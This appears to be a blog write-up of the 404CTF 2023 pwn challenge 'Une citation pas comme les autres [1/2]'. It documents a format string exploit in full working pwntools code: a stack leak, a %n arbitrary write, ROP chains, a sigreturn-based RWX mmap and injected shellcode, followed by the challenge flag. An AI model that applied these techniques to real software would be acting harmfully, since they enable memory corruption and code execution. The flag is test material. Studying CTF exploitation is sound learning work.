---
layout: post
title: 404CTF 2023 | Une citation pas comme les autres [1/2]
image: /assets/images/404ctf/une-citation-pas-comme-les-autres-1-2/cover.png
date: 2023-06-08 16:26:00
categories: [404ctf, pwn, medium, alternative resolution, extreme]
---

This challenge was part of the [404CTF 2023](https://www.404ctf.fr/), organized by the General Directorate for External Security (DGSE) and Télécom SudParis.

# Challenge Description

![Challenge Description]({{site.baseurl}}/assets/images/404ctf/une-citation-pas-comme-les-autres-1-2/description.png)

This writeup tells the adventure of a method which is not the intended way and is a lot more difficult, but it is what it is ¯\\\_(ツ)\_/¯

![checksec output]({{site.baseurl}}/assets/images/404ctf/une-citation-pas-comme-les-autres-1-2/checksec.png)

# Reverse engineering

In the `main` function, we have the choice between 3 functions :
- `count_quotes` : Nothing interesting here
- `pick_quote` : This function picks a random quote in a file called `citations.txt` and prints it. Citations are delimited with `'%'`. This function is very useful and could have saved me hours but why choose the easiest way ? :)
- `write_quote` : We are asked some input, and this input is then printed. We can notice here a **Format String Vulnerability**, as we control the string passed to `printf`.

![Ghidra decompiled write_quote function]({{site.baseurl}}/assets/images/404ctf/la-feuille-blanche/write_quote.png)

# Exploitation

> A **Format String Vulnerability** happens when the user controls the parameter used to format a string. The most common example is in C, with the first argument of `printf`.
> 
> An attacker could inject format specifiers in order to read memory content. This happens because when calling a function, if there is a lot of arguments they will be passed through the stack. Take a look at [this video](https://youtu.be/0WvrSfcdq1I) from the great LiveOverflow for an introduction to this vulnerability.

With `printf`, a *Format String Vulnerability* can be used to leak content of the memory, using `'%x'` or `'%p'`, but also to **write** data thanks to the `'%n'` format specifier and a bit of tweaking.

## Getting a shell ?

The first plan was to leak an address of the stack to compute the return address of `write_quote`, and then write a ROP chain to execute an **execve** syscall and execute `/bin/sh`.

> It would be cleaner to use the return address of the main function instead, but as it is exiting and never returning we cannot do it.
>  
> The ROP chain can be written with several calls to `write_quote`, but it should be written from bottom to top because as soon as the return address is overwritten, the ROP chain will be executed.

The leak is straightforward, as the first address was on the stack :

```py
#!/usr/bin/python3
from pwn import *

REMOTE = False
if REMOTE:
        p = remote('challenges.404ctf.fr', 31719)
else:
        p = process('./une_citation_pas_comme_les_autres_1_2')
        input('Waiting...') # Used to attach gdb to the process

p.recvuntil(b'>>> ')
p.send(b'2\n')
p.recvuntil(b'[Vous] : ')
p.send(b'%p\n')
p.recvuntil(b' : ')
addr = int(p.recvuntil(b'\n').rstrip(b'\n'), 16)

print(f"Leaked addr {hex(addr)}")
targetAddr = addr + 0x5a8
print(f"Target addr {hex(targetAddr)}")
```

Then I wanted to ensure that our write primitive is stable and simple to use, so I wanted to write a function to automate the process of writing some data at a given address. 

The `'%n'` format specifier writes the number of characters printed so far at the addess passed as argument. But if we put an address in our payload, it means that we will have some **null** character, and `printf` will stop at the first `'\0'` encountered.

> For this reason, a payload where the address is before the `'%n'` won't work !

We will then have to put our address at the end of the payload. Such payload will have the following structure :
- Padding `'%c'` to shift parameter counter until the place where the address is
- `'%Nx'` where `N` will control the value that we want to write
- Padding `'_'` for alignment and to ensure that the address is at a fixed position
- The wanted address, little-endian

> For example `b'%c%c%c%c%c%c%c%c%c%4651x%n______________\xff\xff\xff\xff\xff\x7f\x00\x00'` will write `0x1234` at `0x7fffffffffff`

Here is the resulting function :

```py
def write_at(addr, val):
        p.recvuntil(b'>>> ')
        p.send(b'2\n')
        p.recvuntil(b'[Vous] : ')
        sVal = str(val-9) # 9 is the number of chars which will already be written
        payload = (b'%c'*9 + b'%' + sVal.encode() + b'x%n').ljust(40, b'_')
        payload += p64(addr)
        print(f'Sending {payload} to write {hex(val)} at {hex(addr)}')
        p.send(payload + b'\n')
        p.recvuntil(b'.\n') # 
        p.recvuntil(b'.\n') # Discard responses
```

<div class="row-container">
<div>

Another issue is that there was a timeout on the server side, and writing big values is very slow, as the same number of characters as the actual value will have to be printed. The trick I found to reduce the time needed for writing was to **split writing in two**. With this technique there will always be two remaining bytes, so the order of writing becomes important.

</div>
<div>

```
Step 0: xxxxxxxx xxxxxxxx
Step 1: xxxxxxxx 00001234
Step 2: xxxx0000 12341234
```

</div>
</div>

I could then write a classic ROP chain and use my function to write it little by little on memory. I managed to develop an exploit running `execve('/bin/sh',0,0)` which was working locally but I had the feeling that `/bin` was again not mounted on the host (see [404CTF Cache Cache Le Retour]({{site.baseurl}}/posts/404CTF-cache-cache-le-retour/) for more information), so I went for another method.

## Using syscalls

`/bin` is not mounted ? No problem, I will use syscalls to open, read, and print the content of the file !

I rewrote the entire ROP Chain, and struggled a lot to do all the writes before the timeout. With some optimization such as splitting a write in 3 instead of 2, I ended up with a rop chain which I could run on the host, but the file was to big to be printed before timeout...

Here is the ROP Chain, for posteriority. At this time I used another version of my `write_at` function which didn't allow me to write very small values, this is why there is a gimnastic with `0xff01` and `0xff00`.

```py
rop = b''

# open('citations.txt', 0, 0)
rop += p64(0x477ef8) # xor esi, esi ; pop rbx ; mov rax, rsi ; ret
rop += p64(0xff)
rop += p64(0x46ea80) # mov eax, 2 ; ret
rop += p64(0x40225d) # pop rdi ; ret
rop += p64(0x48f116) # &'citations.txt'
rop += p64(0x41a206) # syscall ; ret

# read(3, addr, 0x1000)
rop += p64(0x4128f9) # pop rsi ; ret
rop += p64(addr-READ_COUNT) # buffer addr
rop += p64(0x47ce8b) # pop rdx ; pop rbx ; ret
rop += p64(READ_COUNT)
rop += p64(0xff)
rop += p64(0x480e6b) # pop rcx ; ret
rop += p64(0x48f113)
rop += p64(0x42a994) # sub edi, ecx ; add rax, rdi ; ret
rop += p64(0x4026d6) # xor eax, eax ; ret
rop += p64(0x41a206) # syscall ; ret

# write(1, addr, 0x1000)
rop += p64(0x4026d6) # xor eax, eax ; ret
rop += p64(0x40225d) # pop rdi ; ret
rop += p64(0xff01)
rop += p64(0x480e6b) # pop rcx ; ret
rop += p64(0xff00)
rop += p64(0x42a994) # sub edi, ecx ; add rax, rdi ; ret
rop += p64(0x41a206) # syscall ; ret
```

There could be a lot more improvements, I also tried a version opening `flag.txt`, because I wasn't sure where could be the flag, without success.

As I didn't used the `pick_quote` function, I knew that this was probably not the intended way, but I stood stubborn and wanted to exploit it only with this `printf`. I also had another idea to reduce drasticly the time needed to exploit, and have more freedom.

## Final solution : shellcode !

As I was still not sure of the flag location, I still wanted to have some control to look around easily in the host. If we cannot execute commands, we can directly send bytecode and execute it !

![Drake meme]({{site.baseurl}}/assets/images/404ctf/la-feuille-blanche/meme.png)

This technique requires to have a place in memory which has RWX permissions, but obviously there is no such place in the memory... We will have to create one with `mmap` syscall !

![vmmap in gdb]({{site.baseurl}}/assets/images/404ctf/la-feuille-blanche/vmmap.png)

To sum up, the attack plan was :
- `mmap(0xcaf1000, 0x1000, 7, 1, 0, 0)` : Create a memory mapping with **RWX** (7) permissions, starting at `0xcaf1000`, of `0x1000` bytes
- `read(0, 0xcaf1000, 0x1000)` : Read up to `0x1000` bytes from **stdin** (0), and write result to `0xcaf1000`
- Jump to address `0xcaf1000`

Pretty simple, right ? Well it happens to not be that easy, as we still have to ensure that everything gets executed before the timeout. It took me a while to figure out a way of optimizing my exploit, but I eventually managed to find a way of executing everything with a lot of gadget gymnastic, and using a **sigreturn frame** !

// TODO : add explanations for sigreturn frame

Here is the final exploit :

```py
#!/usr/bin/python3
from pwn import *

REMOTE = False
if REMOTE:
	p = remote('challenges.404ctf.fr', 31719)
else:
	p = process('./une_citation_pas_comme_les_autres_1_2')
	input('Waiting...')

p.recvuntil(b'>>> ')
p.send(b'2\n')
p.recvuntil(b'[Vous] : ')
p.send((b'%p '*12 + b'%.1f').ljust(56, b'_') + b'\n')
p.recvuntil(b' : ')
leak = p.recvuntil(b'\n').rstrip(b'\n')
addr = int(leak.split(b' ')[0], 16)
MIN_VAL = 9

print(leak)
print(f"Leaked addr {hex(addr)}")
targetAddr = addr + 0x5a8
print(f"Target addr {hex(targetAddr)}")

def write_rop(offset, val):
        p.recvuntil(b'>>> ')
        p.send(b'2\n')
        p.recvuntil(b'[Vous] : ')
        sVal = str(val-9)
        payload = (b'%c'*9 + b'%' + sVal.encode() + b'x%n').ljust(40, b'_')
        payload += p64(targetAddr+offset)
        print(f'Sending {payload} to write {hex(val)} at {hex(targetAddr+offset)}')
        p.send(payload + b'\n')
        p.recvuntil(b'.\n') #
        p.recvuntil(b'.\n') # Discard response

def clear_all(offset, length):
	# Clear all
	for i in range(length-4, -3, -3):
		write_rop(offset+i, MIN_VAL+1)

# mmap(0xcaf1000, 0x1000, 7, 1, 0, 0)
# using sigreturn frame

offset = 16+8
clear_all(offset, 248)
write_rop(offset+55, 0x2200)
write_rop(offset+64, 0x246)
write_rop(offset+104, 0x1000)
write_rop(offset+106, 0x0caf)
write_rop(offset+114, 0x100) # Size must be way over 0x91ff22, so 0x01000000
write_rop(offset+135, 0x0700)
write_rop(offset+143, 0x0900)
write_rop(offset+143+8, 0x2200)

newRSP = targetAddr + 0x110
write_rop(offset+160, newRSP & 0xffff)
write_rop(offset+162, (newRSP & 0xffff0000)>>16)
write_rop(offset+164, newRSP>>32)

write_rop(offset+168, 0xa206) # rip = syscall ; ret
write_rop(offset+169, 0x41a2) # rip = syscall ; ret

write_rop(offset+183, 0x3300)

write_rop(offset+104, 0x1000)
write_rop(offset+106, 0x0caf)

write_rop(16+4, MIN_VAL+1) # clear
write_rop(16, 0xdf71) # mov eax, 0xf ; syscall
write_rop(17, 0x47df) # mov eax, 0xf ; syscall

offset=272
rop = b''
# read(0, addr, 0x1000)
rop += p64(0x4128f9) # pop rsi ; ret
rop += p64(0xcaf1000) # buffer addr
rop += p64(0x47ce8b) # pop rdx ; pop rbx ; ret
rop += p64(0x500) # Shellcode length
rop += p64(MIN_VAL+1)
rop += p64(0x480e6b) # pop rcx ; ret
rop += p64(0xcaf1000)
rop += p64(0x42a994) # sub edi, ecx ; add rax, rdi ; ret
rop += p64(0x4026d6) # xor eax, eax ; ret
rop += p64(0x41a206) # syscall ; ret
rop += p64(0xcaf1000)

for i in range(len(rop)-8, -1, -8):
        # Clear upper bytes
        #if i in [len(rop)-x*8 for x in ]:
        #write_rop(offset+i+4 +8*2, MIN_VAL+1)
        #write_rop(offset+i+3 +8*2, MIN_VAL+1)

        # Write value
        val = u64(rop[i:i+8])
        ol1 = 2
        l1 = val >> 16
        l2 = (val & 0xffff)
        if (l1!=0 and l1<MIN_VAL+1):
                ol1-=1
                l1 = val >> 8
                l2 = (val & 0xfff)

        if (l1!=0 and l1<MIN_VAL+1) or (l2!=0 and l2<MIN_VAL+1):
                print(f"Warning : {hex(l1)} | {hex(l2)[2:]} (ol1={ol1}) at i={i}")

        if l2!=0:
                write_rop(offset+i, l2)
        if l1!=0:
                write_rop(offset+i +ol1, l1)


# Trigger execution
write_rop(0, 0x42de20) # pop rax ; ret

context.clear(arch='x86-64', os='linux')
shellcode = asm('''
mov rbp, 0xcaf110d
mov rsp, 0xcaf1115

mov rdi, 1
mov rdx, 0x0d
lea rsi, [rsp]
mov rax, 1
syscall

_open:
lea rdi, [rsp]
xor rax, rax
add al, 2
xor rsi, rsi
syscall
mov r8, rax

mov [rbp], rax
mov rdi, 1
mov rdx, 0x8
mov rsi, rbp
mov rax, 1
syscall

_lseek:
mov rax, 8
mov rdi, r8
mov rsi, 0x0
mov rdx, 0
syscall

mov [rbp], rax
mov rdi, 1
mov rdx, 0x8
mov rsi, rbp
mov rax, 1
syscall

_read:
xor rax, rax
mov rdi, r8
mov rsi, rsp
mov edx, 0x91ff23
syscall

mov [rbp], rax
mov rdi, 1
mov rdx, 0x8
mov rsi, rbp
mov rax, 1
syscall

xor eax, eax
lea rsi, [rsp]
_while:
inc rsi
mov al, [rsi]
cmp al, 0x7b
jnz _while

sub rsi, 0x10
_write:
mov rdi, 1
mov rdx, 0x100
mov rax, 1
syscall

mov [rbp], rax
mov rdi, 1
mov rdx, 0x8
mov rsi, rbp
mov rax, 1
syscall

xor rax, rax
add al, 60
syscall

_stack:
''')

p.send(shellcode + b"\x00"*8 + b"citations.txt\x00")

p.interactive()
```

# Getting the flag

![expl.py output]({{site.baseurl}}/assets/images/404ctf/la-feuille-blanche/exploit.png)

> ✅ Flag : `404CTF{3H_813N!0U1_C357_M0N_V1C3.D3P141r3_357_M0N_P14151r.J41M3_QU0N_M3_H41553}`
